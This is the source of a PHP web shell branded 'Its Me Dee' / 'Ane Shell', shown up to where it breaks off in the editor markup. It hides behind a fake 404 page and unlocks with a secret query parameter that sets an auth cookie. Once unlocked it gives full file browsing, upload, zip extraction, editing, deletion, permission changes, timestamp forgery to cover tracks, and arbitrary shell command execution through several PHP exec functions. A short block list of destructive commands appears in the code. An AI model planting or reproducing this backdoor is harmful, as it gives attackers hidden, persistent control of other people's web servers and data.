<?php
error_reporting(0);
session_start();

$valid_hash = "d7710655dfd238c75bfbf383dc8e7e32";

$is_authenticated = false;

if (isset($_COOKIE['auth']) && $_COOKIE['auth'] === $valid_hash) {
    $is_authenticated = true;
}

if (!$is_authenticated && isset($_GET['bos168'])) {
    setcookie('auth', $valid_hash, time() + (86400 * 30), '/');
    $is_authenticated = true;
    
    header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
    exit;
}

if (!$is_authenticated) {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>404 Not Found</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                position: relative;
                overflow: hidden;
            }
            
            .container {
                text-align: center;
                padding: 20px;
                position: relative;
                z-index: 1;
                animation: fadeInUp 1s ease-out;
            }
            
            @keyframes fadeInUp {
                from {
                    opacity: 0;
                    transform: translateY(30px);
                }
                to {
                    opacity: 1;
                    transform: translateY(0);
                }
            }
            
            .glitch-text {
                font-size: 5rem;
                font-weight: bold;
                text-transform: uppercase;
                color: #c084fc;
                text-shadow: 
                    3px 3px 0 #ff00ff,
                    -3px -3px 0 #c084fc;
                animation: glitch 0.3s infinite;
                font-family: 'Courier New', monospace;
                letter-spacing: 8px;
            }
            
            @keyframes glitch {
                0%, 100% { transform: translate(0); }
                20% { transform: translate(-2px, 2px); }
                40% { transform: translate(-2px, -2px); }
                60% { transform: translate(2px, 2px); }
                80% { transform: translate(2px, -2px); }
            }
            
            @media (max-width: 768px) {
                .glitch-text { font-size: 2.5rem; letter-spacing: 4px; }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="glitch-text">404 Not Found</div>
        </div>
        
        <script>
            const canvas = document.createElement('canvas');
            canvas.style.position = 'fixed';
            canvas.style.top = '0';
            canvas.style.left = '0';
            canvas.style.width = '100%';
            canvas.style.height = '100%';
            canvas.style.pointerEvents = 'none';
            canvas.style.zIndex = '0';
            document.body.appendChild(canvas);
            
            const ctx = canvas.getContext('2d');
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            
            const matrix = "01&#12450;&#12452;&#12454;&#12456;&#12458;&#12459;&#12461;&#12463;&#12465;&#12467;&#12469;&#12471;&#12473;&#12475;&#12477;&#12479;&#12481;&#12484;&#12486;&#12488;&#12490;&#12491;&#12492;&#12493;&#12494;&#12495;&#12498;&#12501;&#12504;&#12507;&#12510;&#12511;&#12512;&#12513;&#12514;&#12516;&#12518;&#12520;&#12521;&#12522;&#12523;&#12524;&#12525;&#12527;&#12530;&#12531;";
            const matrixArray = matrix.split("");
            
            const fontSize = 12;
            const columns = canvas.width / fontSize;
            
            const drops = [];
            for(let x = 0; x < columns; x++) {
                drops[x] = 1;
            }
            
            function draw() {
                ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                
                ctx.fillStyle = '#c084fc';
                ctx.font = fontSize + 'px monospace';
                
                for(let i = 0; i < drops.length; i++) {
                    const text = matrixArray[Math.floor(Math.random() * matrixArray.length)];
                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                    
                    if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                        drops[i] = 0;
                    }
                    drops[i]++;
                }
            }
            
            setInterval(draw, 35);
            
            window.addEventListener('resize', () => {
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
            });
        </script>
    </body>
    </html>
    <?php
    exit;
}

// Initialize session variables
if (!isset($_SESSION['current_path'])) {
    $_SESSION['current_path'] = getcwd() ?: $_SERVER['DOCUMENT_ROOT'];
}
if (!isset($_SESSION['error_message'])) {
    $_SESSION['error_message'] = '';
}

// Check if ZipArchive is available
$zip_available = class_exists('ZipArchive');

// Handle AJAX requests
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['ajax'])) {
    header('Content-Type: application/json');
    
    $response = ['success' => false, 'error' => '', 'data' => null];
    $action = $_POST['action'] ?? '';
    
    try {
        switch ($action) {
            case 'navigate':
                $target_path = $_POST['path'] ?? '';
                if (!empty($target_path)) {
                    if ($target_path[0] !== DIRECTORY_SEPARATOR && $target_path !== 'root') {
                        $target_path = $_SESSION['current_path'] . DIRECTORY_SEPARATOR . $target_path;
                    }
                    $real_path = realpath($target_path);
                    if ($real_path && is_dir($real_path) && is_readable($real_path)) {
                        $_SESSION['current_path'] = $real_path;
                        $_SESSION['error_message'] = '';
                        $response['success'] = true;
                    } else {
                        $_SESSION['error_message'] = 'Cannot access this directory';
                        $response['error'] = $_SESSION['error_message'];
                    }
                }
                break;
                
            case 'list':
                $current_path = $_SESSION['current_path'];
                $items = getDirectoryContents($current_path);
                $breadcrumb = getFullBreadcrumb($current_path);
                $error = $_SESSION['error_message'];
                $_SESSION['error_message'] = '';
                
                $response['success'] = true;
                $response['data'] = [
                    'items' => $items,
                    'breadcrumb' => $breadcrumb,
                    'error' => $error,
                    'current_path' => $current_path
                ];
                break;
                
            case 'delete':
                $target = $_POST['target'] ?? '';
                $fullpath = $_SESSION['current_path'] . DIRECTORY_SEPARATOR . $target;
                if (file_exists($fullpath) && is_writable($fullpath)) {
                    if (is_file($fullpath)) {
                        unlink($fullpath);
                        $response['success'] = true;
                    } elseif (is_dir($fullpath)) {
                        deleteDirectory($fullpath);
                        $response['success'] = true;
                    }
                } else {
                    $response['error'] = 'Cannot delete ' . $target;
                }
                break;
                
            case 'rename':
                $old = $_POST['old'] ?? '';
                $new = $_POST['new'] ?? '';
                $fullpath_old = $_SESSION['current_path'] . DIRECTORY_SEPARATOR . $old;
                $fullpath_new = $_SESSION['current_path'] . DIRECTORY_SEPARATOR . $new;
                if (file_exists($fullpath_old) && is_writable($fullpath_old) && !file_exists($fullpath_new)) {
                    rename($fullpath_old, $fullpath_new);
                    $response['success'] = true;
                } else {
                    $response['error'] = 'Cannot rename ' . $old;
                }
                break;
                
            case 'newfolder':
                $name = $_POST['name'] ?? '';
                $fullpath = $_SESSION['current_path'] . DIRECTORY_SEPARATOR . $name;
                if (is_writable($_SESSION['current_path']) && !file_exists($fullpath)) {
                    mkdir($fullpath, 0755, true);
                    $response['success'] = true;
                } else {
                    $response['error'] = 'Cannot create folder';
                }
                break;
                
            case 'newfile':
                $name = $_POST['name'] ?? '';
                $fullpath = $_SESSION['current_path'] . DIRECTORY_SEPARATOR . $name;
                if (is_writable($_SESSION['current_path']) && !file_exists($fullpath)) {
                    file_put_contents($fullpath, '');
                    $response['success'] = true;
                } else {
                    $response['error'] = 'Cannot create file';
                }
                break;
                
            case 'upload':
                if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
                    $dest = $_SESSION['current_path'] . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
                    if (is_writable($_SESSION['current_path'])) {
                        if (move_uploaded_file($_FILES['file']['tmp_name'], $dest)) {
                            $response['success'] = true;
                        } else {
                            $response['error'] = 'Failed to move uploaded file';
                        }
                    } else {
                        $response['error'] = 'Directory is not writable';
                    }
                } else {
                    $response['error'] = 'Upload failed: ' . ($_FILES['file']['error'] ?? 'No file');
                }
                break;
                
            case 'upload_extract':
                if (!$zip_available) {
                    $response['error'] = 'ZipArchive not available';
                } elseif (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
                    $file_ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
                    if ($file_ext == 'zip') {
                        $dest = $_SESSION['current_path'] . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
                        if (is_writable($_SESSION['current_path'])) {
                            if (move_uploaded_file($_FILES['file']['tmp_name'], $dest)) {
                                $zip = new ZipArchive;
                                if ($zip->open($dest) === TRUE) {
                                    $extract_path = $_SESSION['current_path'] . DIRECTORY_SEPARATOR . pathinfo($dest, PATHINFO_FILENAME);
                                    if (!is_dir($extract_path)) {
                                        mkdir($extract_path, 0755, true);
                                    }
                                    $zip->extractTo($extract_path);
                                    $zip->close();
                                    unlink($dest);
                                    $response['success'] = true;
                                    $response['data'] = ['extract_path' => $extract_path];
                                } else {
                                    $response['error'] = 'Invalid ZIP file';
                                    @unlink($dest);
                                }
                            } else {
                                $response['error'] = 'Failed to move uploaded file';
                            }
                        } else {
                            $response['error'] = 'Directory is not writable';
                        }
                    } else {
                        $response['error'] = 'File must be ZIP format';
                    }
                } else {
                    $response['error'] = 'Upload failed';
                }
                break;
                
            case 'chmod':
                $target = $_POST['target'] ?? '';
                $perms = $_POST['perms'] ?? '';
                $fullpath = $_SESSION['current_path'] . DIRECTORY_SEPARATOR . $target;
                if (file_exists($fullpath)) {
                    $octal = octdec($perms);
                    if (chmod($fullpath, $octal)) {
                        $response['success'] = true;
                    } else {
                        $response['error'] = 'Cannot change permissions';
                    }
                } else {
                    $response['error'] = 'File not found';
                }
                break;
                
            case 'touch':
                $target = $_POST['target'] ?? '';
                $date = $_POST['date'] ?? '';
                $fullpath = $_SESSION['current_path'] . DIRECTORY_SEPARATOR . $target;
                if (file_exists($fullpath)) {
                    $timestamp = strtotime($date);
                    if ($timestamp && $timestamp > 0) {
                        if (touch($fullpath, $timestamp)) {
                            $response['success'] = true;
                        } else {
                            $response['error'] = 'Cannot change date';
                        }
                    } else {
                        $response['error'] = 'Invalid date format. Use: YYYY-MM-DD HH:MM:SS';
                    }
                } else {
                    $response['error'] = 'File not found';
                }
                break;
                
            case 'edit':
                $target = $_POST['target'] ?? '';
                $fullpath = $_SESSION['current_path'] . DIRECTORY_SEPARATOR . $target;
                if (is_file($fullpath) && is_readable($fullpath)) {
                    $content = file_get_contents($fullpath);
                    $response['success'] = true;
                    $response['data'] = ['content' => $content, 'file' => $target];
                } else {
                    $response['error'] = 'Cannot read file';
                }
                break;
                
            case 'save':
                $target = $_POST['target'] ?? '';
                $content = $_POST['content'] ?? '';
                $fullpath = $_SESSION['current_path'] . DIRECTORY_SEPARATOR . $target;
                if (is_writable($fullpath)) {
                    if (file_put_contents($fullpath, $content) !== false) {
                        $response['success'] = true;
                    } else {
                        $response['error'] = 'Cannot save file';
                    }
                } else {
                    $response['error'] = 'File is not writable';
                }
                break;
                
            case 'command':
                $cmd = $_POST['cmd'] ?? '';
                $output = executeCommand($cmd);
                $response['success'] = true;
                $response['data'] = ['output' => $output];
                break;
        }
    } catch (Exception $e) {
        $response['error'] = $e->getMessage();
    }
    
    echo json_encode($response);
    exit;
}

// Helper functions
function executeCommand($cmd) {
    $dangerous = ['rm -rf', 'dd if=', 'mkfs', ':(){', 'fork bomb'];
    foreach ($dangerous as $danger) {
        if (stripos($cmd, $danger) !== false) {
            return "[SECURITY] Command blocked for safety reasons.";
        }
    }
    
    $disabled = explode(',', ini_get('disable_functions'));
    $output = '';
    
    if (function_exists('shell_exec') && !in_array('shell_exec', $disabled)) {
        $output = shell_exec($cmd . ' 2>&1');
    } elseif (function_exists('exec') && !in_array('exec', $disabled)) {
        exec($cmd . ' 2>&1', $out);
        $output = implode("\n", $out);
    } elseif (function_exists('system') && !in_array('system', $disabled)) {
        ob_start();
        system($cmd);
        $output = ob_get_clean();
    } elseif (function_exists('passthru') && !in_array('passthru', $disabled)) {
        ob_start();
        passthru($cmd);
        $output = ob_get_clean();
    } elseif (function_exists('popen') && !in_array('popen', $disabled)) {
        $handle = popen($cmd, 'r');
        $output = stream_get_contents($handle);
        pclose($handle);
    } else {
        $output = "[ERROR] Shell execution is disabled on this server.";
    }
    
    return $output ?: "(No output)";
}

function getDirectoryContents($path) {
    $items = [];
    if (!is_readable($path)) {
        $_SESSION['error_message'] = 'Cannot read this directory';
        return [];
    }
    
    $files = scandir($path);
    if ($files === false) {
        $_SESSION['error_message'] = 'Cannot scan directory';
        return [];
    }
    
    $dirs = [];
    $file_items = [];
    
    foreach ($files as $item) {
        if ($item === '.' || $item === '..') continue;
        
        $fullpath = $path . DIRECTORY_SEPARATOR . $item;
        $is_dir = is_dir($fullpath);
        
        $item_data = [
            'name' => $item,
            'is_dir' => $is_dir,
            'size' => $is_dir ? '-' : formatSize(@filesize($fullpath)),
            'perms' => getPerms($fullpath),
            'owner' => getOwner($fullpath),
            'modified' => @date('Y-m-d H:i', @filemtime($fullpath)),
            'perm_class' => getPermClass(getPerms($fullpath))
        ];
        
        if ($is_dir) {
            $dirs[] = $item_data;
        } else {
            $file_items[] = $item_data;
        }
    }
    
    usort($dirs, function($a, $b) { return strcasecmp($a['name'], $b['name']); });
    usort($file_items, function($a, $b) { return strcasecmp($a['name'], $b['name']); });
    
    return array_merge($dirs, $file_items);
}

function getFullBreadcrumb($path) {
    $parts = explode(DIRECTORY_SEPARATOR, $path);
    $breadcrumb = [];
    $current = '';
    
    foreach ($parts as $part) {
        if (empty($part)) {
            if (empty($current)) {
                $current = DIRECTORY_SEPARATOR;
                $breadcrumb[] = ['name' => 'Root', 'path' => DIRECTORY_SEPARATOR];
            }
            continue;
        }
        
        if ($current === DIRECTORY_SEPARATOR || empty($current)) {
            $current .= $part;
        } else {
            $current .= DIRECTORY_SEPARATOR . $part;
        }
        
        $breadcrumb[] = [
            'name' => $part,
            'path' => $current
        ];
    }
    
    return $breadcrumb;
}

function formatSize($bytes) {
    if ($bytes === false || $bytes === null) return '-';
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = 0;
    while ($bytes >= 1024 && $i < 4) {
        $bytes /= 1024;
        $i++;
    }
    return round($bytes, 2) . ' ' . $units[$i];
}

function getPerms($path) {
    $perms = @fileperms($path);
    if ($perms === false) return '---';
    return substr(sprintf('%o', $perms), -4);
}

function getOwner($path) {
    if (function_exists('posix_getpwuid')) {
        $uid = @fileowner($path);
        if ($uid !== false) {
            $user = @posix_getpwuid($uid);
            return $user['name'] ?? $uid;
        }
    }
    return '-';
}

function getPermClass($perms) {
    if ($perms == '0755') return 'perm-755';
    if ($perms == '0644') return 'perm-644';
    if ($perms == '0777') return 'perm-777';
    return 'perm-other';
}

function deleteDirectory($dir) {
    if (!is_dir($dir)) return false;
    
    $files = array_diff(scandir($dir), ['.', '..']);
    foreach ($files as $file) {
        $path = $dir . DIRECTORY_SEPARATOR . $file;
        if (is_dir($path)) {
            deleteDirectory($path);
        } else {
            @unlink($path);
        }
    }
    return @rmdir($dir);
}

// Get server info
$server_user = 'unknown';
if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
    $user_info = @posix_getpwuid(@posix_geteuid());
    $server_user = $user_info['name'] ?? 'unknown';
}

$home_path = dirname(__FILE__);
$php_version = PHP_VERSION;
$server_os = php_uname('s') ?: PHP_OS;
$server_ip = $_SERVER['SERVER_ADDR'] ?? $_SERVER['LOCAL_ADDR'] ?? 'Unknown';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Its Me Dee</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Fira+Code:wght@400;500;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #c084fc;
            --primary-dark: #a855f7;
            --primary-glow: rgba(192, 132, 252, 0.5);
            --secondary: #d946ef;
            --secondary-glow: rgba(217, 70, 239, 0.4);
            --accent: #a78bfa;
            --bg-dark: #050508;
            --bg-darker: #020204;
            --bg-card: rgba(8, 8, 16, 0.75);
            --bg-card-solid: #0a0a14;
            --text: #e8e8ee;
            --text-dim: #8a8a9e;
            --border: rgba(192, 132, 252, 0.4);
            --border-glow: 0 0 10px rgba(192, 132, 252, 0.25);
            --success: #c084fc;
            --error: #ff3366;
            --warning: #ffaa00;
        }
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            background: var(--bg-darker);
            font-family: 'Inter', sans-serif;
            color: var(--text);
            line-height: 1.6;
            overflow-x: hidden;
            min-height: 100vh;
        }
        
        /* 3D Animated Background */
        .bg-3d {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -2;
            background: radial-gradient(ellipse at center, #0a0a1a 0%, #020208 100%);
        }
        
        .particles-3d {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            pointer-events: none;
        }
        
        .matrix-canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            opacity: 0.08;
            pointer-events: none;
        }
        
        /* Floating orbs background */
        .orb {
            position: fixed;
            border-radius: 50%;
            filter: blur(60px);
            opacity: 0.15;
            pointer-events: none;
            z-index: -1;
            animation: floatOrb 20s infinite ease-in-out;
        }
        
        @keyframes floatOrb {
            0%, 100% { transform: translate(0, 0) scale(1); }
            25% { transform: translate(5%, 3%) scale(1.1); }
            50% { transform: translate(-3%, 8%) scale(0.95); }
            75% { transform: translate(8%, -2%) scale(1.05); }
        }
        
        .app-container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
            position: relative;
            z-index: 10;
        }
        
        /* 3D Header with Glassmorphism */
        .header-3d {
            background: var(--bg-card);
            backdrop-filter: blur(15px);
            border-radius: 28px;
            padding: 20px 32px;
            margin-bottom: 24px;
            border: 1px solid var(--border);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4), var(--border-glow);
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 20px;
            transform-style: preserve-3d;
            transition: all 0.3s ease;
        }
        
        .header-3d:hover {
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5), 0 0 20px rgba(192, 132, 252, 0.3);
            border-color: var(--primary);
        }
        
        /* Animated 3D Logo - Purple Neon Theme */
        .logo-3d {
            perspective: 800px;
            text-align: center;
        }
        
        .main-title {
            font-size: 32px;
            font-weight: 800;
            background: linear-gradient(135deg, #c084fc, #d946ef, #a78bfa, #e879f9);
            background-size: 200% 200%;
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            animation: gradientShift 4s ease infinite, float3d 3s ease-in-out infinite;
            display: inline-block;
            transform-style: preserve-3d;
            letter-spacing: 3px;
            text-shadow: 0 0 25px rgba(192, 132, 252, 0.8), 0 0 5px rgba(217, 70, 239, 0.5);
            position: relative;
        }
        
        .main-title::before,
        .main-title::after {
            content: attr(data-text);
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #c084fc, #d946ef);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            opacity: 0.7;
        }
        
        .main-title::before {
            animation: glitchShift1 1.5s infinite linear alternate-reverse;
            left: 2px;
            text-shadow: -2px 0 #d946ef;
            clip-path: polygon(0 0, 100% 0, 100% 45%, 0 45%);
        }
        
        .main-title::after {
            animation: glitchShift2 1.5s infinite linear alternate-reverse;
            left: -2px;
            text-shadow: 2px 0 #a78bfa;
            clip-path: polygon(0 55%, 100% 55%, 100% 100%, 0 100%);
        }
        
        @keyframes gradientShift {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }
        
        @keyframes float3d {
            0% { transform: translateY(0px) rotateX(0deg) rotateY(0deg); }
            50% { transform: translateY(-6px) rotateX(4deg) rotateY(2deg); }
            100% { transform: translateY(0px) rotateX(0deg) rotateY(0deg); }
        }
        
        @keyframes glitchShift1 {
            0% { clip-path: polygon(0 0, 100% 0, 100% 45%, 0 45%); }
            100% { clip-path: polygon(0 0, 100% 0, 100% 55%, 0 55%); }
        }
        
        @keyframes glitchShift2 {
            0% { clip-path: polygon(0 80%, 100% 20%, 100% 100%, 0 100%); }
            100% { clip-path: polygon(0 70%, 100% 30%, 100% 100%, 0 100%); }
        }
        
        .subtitle {
            font-size: 11px;
            letter-spacing: 4px;
            color: var(--primary);
            text-shadow: 0 0 8px var(--primary);
            margin-top: 6px;
            font-weight: 500;
            opacity: 0.9;
            display: block;
        }
        
        .stats-3d {
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
        }
        
        .stat-card {
            background: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(8px);
            border-radius: 20px;
            padding: 8px 18px;
            border: 1px solid rgba(192, 132, 252, 0.3);
            transition: all 0.3s cubic-bezier(0.2, 0.9, 0.4, 1.1);
            font-size: 12px;
            font-weight: 500;
        }
        
        .stat-card i {
            color: var(--primary);
            margin-right: 8px;
        }
        
        .stat-card:hover {
            transform: translateY(-3px) scale(1.02);
            border-color: var(--primary);
            box-shadow: 0 0 18px rgba(192, 132, 252, 0.3);
        }
        
        /* Breadcrumb 3D */
        .breadcrumb-3d {
            background: var(--bg-card);
            backdrop-filter: blur(12px);
            border-radius: 20px;
            padding: 14px 24px;
            margin-bottom: 20px;
            border: 1px solid var(--border);
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            gap: 8px;
            font-family: 'Fira Code', monospace;
            font-size: 13px;
        }
        
        /* Action Bar */
        .action-bar-3d {
            background: var(--bg-card);
            backdrop-filter: blur(12px);
            border-radius: 24px;
            padding: 18px 24px;
            margin-bottom: 24px;
            border: 1px solid var(--border);
            display: flex;
            flex-wrap: wrap;
            gap: 16px;
            align-items: center;
        }
        
        .action-group {
            display: flex;
            gap: 10px;
            background: rgba(0, 0, 0, 0.4);
            padding: 5px 16px;
            border-radius: 60px;
            align-items: center;
            border: 1px solid rgba(192, 132, 252, 0.25);
        }
        
        .cyber-input {
            background: rgba(0, 0, 0, 0.7);
            border: 1px solid var(--border);
            color: var(--primary);
            padding: 8px 16px;
            border-radius: 40px;
            font-family: 'Fira Code', monospace;
            font-size: 13px;
            outline: none;
            transition: all 0.3s;
        }
        
        .cyber-input:focus {
            border-color: var(--primary);
            box-shadow: 0 0 15px rgba(192, 132, 252, 0.5);
            transform: scale(1.02);
        }
        
        .cyber-button {
            background: linear-gradient(135deg, rgba(192, 132, 252, 0.15), rgba(168, 85, 247, 0.1));
            border: 1px solid var(--primary);
            color: var(--primary);
            padding: 8px 22px;
            border-radius: 40px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }
        
        .cyber-button:hover {
            background: rgba(192, 132, 252, 0.25);
            transform: translateY(-2px) scale(1.02);
            box-shadow: 0 5px 20px rgba(192, 132, 252, 0.4);
            border-color: var(--secondary);
        }
        
        /* File Table 3D */
        .file-table-container {
            background: var(--bg-card);
            backdrop-filter: blur(10px);
            border-radius: 24px;
            border: 1px solid var(--border);
            overflow-x: auto;
            margin-bottom: 24px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            transition: all 0.3s;
        }
        
        .file-table {
            width: 100%;
            border-collapse: collapse;
        }
        
        .file-table th {
            background: rgba(192, 132, 252, 0.1);
            color: var(--primary);
            font-weight: 700;
            font-size: 12px;
            padding: 16px 14px;
            text-align: left;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .file-table td {
            padding: 14px 12px;
            border-bottom: 1px solid rgba(192, 132, 252, 0.1);
            font-size: 13px;
        }
        
        .file-table tr:hover td {
            background: rgba(192, 132, 252, 0.08);
            transform: scale(1.001);
        }
        
        .dir-item {
            color: var(--primary);
            font-weight: 600;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            transition: all 0.2s;
        }
        
        .file-item {
            color: var(--text);
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            transition: all 0.2s;
        }
        
        .dir-item:hover, .file-item:hover {
            text-shadow: 0 0 8px var(--primary);
            transform: translateX(3px);
        }
        
        /* Terminal 3D */
        .terminal-3d {
            background: var(--bg-card);
            backdrop-filter: blur(12px);
            border-radius: 24px;
            border: 1px solid var(--border);
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }
        
        .terminal-header {
            background: rgba(0, 0, 0, 0.6);
            padding: 14px 24px;
            border-bottom: 1px solid var(--border);
            font-family: 'Fira Code', monospace;
            font-size: 12px;
        }
        
        .terminal-body {
            background: rgba(0, 0, 0, 0.4);
            padding: 20px;
            max-height: 300px;
            overflow-y: auto;
            font-family: 'Fira Code', monospace;
            font-size: 12px;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        
        /* Modal Editor */
        .editor-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.96);
            backdrop-filter: blur(20px);
            z-index: 1000;
            display: none;
            justify-content: center;
            align-items: center;
        }
        
        .editor-content {
            width: 90%;
            height: 85%;
            background: var(--bg-card-solid);
            border: 2px solid var(--primary);
            border-radius: 28px;
            display: flex;
            flex-direction: column;
            overflow: hidden;
            box-shadow: 0 0 60px rgba(192, 132, 252, 0.4);
        }
        
        .toast {
            position: fixed;
            bottom: 30px;
            right: 30px;
            background: rgba(10, 10, 20, 0.95);
            backdrop-filter: blur(12px);
            border-left: 4px solid var(--primary);
            padding: 14px 26px;
            border-radius: 16px;
            display: none;
            z-index: 2000;
            animation: slideInRight 0.3s ease-out;
            font-weight: 500;
        }
        
        @keyframes slideInRight {
            from { opacity: 0; transform: translateX(100px); }
            to { opacity: 1; transform: translateX(0); }
        }
        
        .toast.show { display: block; }
        .toast.error { border-left-color: var(--error); }
        .toast.success { border-left-color: var(--success); }
        
        /* Scrollbar */
        ::-webkit-scrollbar { width: 8px; height: 8px; }
        ::-webkit-scrollbar-track { background: #0a0a14; border-radius: 10px; }
        ::-webkit-scrollbar-thumb { background: var(--primary); border-radius: 10px; }
        
        @media (max-width: 768px) {
            .app-container { padding: 12px; }
            .main-title { font-size: 22px; }
            .action-bar-3d { flex-direction: column; align-items: stretch; }
            .action-group { justify-content: space-between; flex-wrap: wrap; }
        }
    </style>
</head>
<body>
    <div class="bg-3d"></div>
    <canvas id="matrixCanvas" class="matrix-canvas"></canvas>
    
    <!-- Floating 3D Orbs - Purple Theme -->
    <div class="orb" style="width: 400px; height: 400px; background: #c084fc; top: -100px; right: -100px; animation-duration: 25s;"></div>
    <div class="orb" style="width: 300px; height: 300px; background: #d946ef; bottom: -80px; left: -80px; animation-duration: 30s;"></div>
    <div class="orb" style="width: 250px; height: 250px; background: #a78bfa; top: 50%; left: 50%; animation-duration: 35s; opacity: 0.08;"></div>
    
<div class="app-container">
        <div class="header-3d">
            <div class="logo-3d">
                <div class="main-title" data-text="IT'S ME DEE">IT'S ME DEE</div>
                <small class="subtitle">&#9889;SHEL ANE&#9889;</small>
            </div>
            <div class="stats-3d">
                <div class="stat-card"><i class="fas fa-microchip"></i> <?= htmlspecialchars($server_os) ?></div>
                <div class="stat-card"><i class="fab fa-php"></i> PHP <?= htmlspecialchars($php_version) ?></div>
                <div class="stat-card"><i class="fas fa-user-astronaut"></i> <?= htmlspecialchars($server_user) ?></div>
                <div class="stat-card"><i class="fas fa-globe"></i> <?= htmlspecialchars($server_ip) ?></div>
            </div>
        </div>
        
        <div class="breadcrumb-3d" id="breadcrumb"></div> 
        
        <div class="action-bar-3d">
            <div class="action-group">
                <i class="fas fa-folder-plus"></i>
                <input type="text" id="new-folder" class="cyber-input" placeholder="Folder name" onkeypress="if(event.key==='Enter') createFolder()">
                <button onclick="createFolder()" class="cyber-button"><i class="fas fa-plus"></i> Create</button>
            </div>
            
            <div class="action-group">
                <i class="fas fa-file"></i>
                <input type="text" id="new-file" class="cyber-input" placeholder="File name" onkeypress="if(event.key==='Enter') createFile()">
                <button onclick="createFile()" class="cyber-button"><i class="fas fa-plus"></i> Create</button>
            </div>
            
            <div class="action-group">
                <label for="upload-file" class="cyber-button" style="cursor:pointer"><i class="fas fa-upload"></i> Upload</label>
                <input type="file" id="upload-file" style="display:none" onchange="uploadFile(this)">
                
                <?php if ($zip_available): ?>
                <label for="upload-zip" class="cyber-button" style="cursor:pointer"><i class="fas fa-file-archive"></i> Upload+Extract</label>
                <input type="file" id="upload-zip" accept=".zip" style="display:none" onchange="uploadAndExtract(this)">
                <?php endif; ?>
            </div>
            
            <div class="action-group">
                <button onclick="refreshDirectory()" class="cyber-button"><i class="fas fa-sync-alt"></i> Refresh</button>
                <button onclick="goHome()" class="cyber-button"><i class="fas fa-home"></i> Home</button>
            </div>
        </div>
        
        <div class="file-table-container">
            <table class="file-table">
                <thead>
                    <tr>
                        <th>Name</th>
                        <th>Size</th>
                        <th>Permissions</th>
                        <th>Owner</th>
                        <th>Modified</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody id="file-list">
                    <tr><td colspan="6" class="loading"><i class="fas fa-spinner fa-spin"></i> Loading 3D Interface...</td></tr>
                </tbody>
            </table>
        </div>
        
        <div class="terminal-3d">
            <div class="terminal-header">
                <span><i class="fas fa-terminal"></i> ANE TERMINAL</span> 
                <span><i class="fas fa-skull"></i></span>
            </div>
            <div class="terminal-body" id="terminal-output">
                <span style="color: var(--primary);">&#10140;</span> Welcome to Ane Shell<br>
                <span style="color: var(--primary);">&#10140;</span> Type commands below to execute system commands<br>
                <span style="color: var(--primary);">&#10140;</span> Examples: ls, pwd, whoami, php -v
            </div>
            <div class="terminal-input" style="display:flex; border-top:1px solid var(--border)">
                <input type="text" id="terminal-cmd" class="cyber-input" style="flex:1; border-radius:0; background:rgba(0,0,0,0.6)" placeholder="Enter command..." onkeypress="if(event.key==='Enter') executeCommand()">
                <button onclick="executeCommand()" class="cyber-button" style="border-radius:0 20px 20px 0; margin:0"><i class="fas fa-play"></i> Execute</button>
            </div>
        </div>
    </div>
    
    <div id="editorModal" class="editor-modal">
        <div class="editor-content">
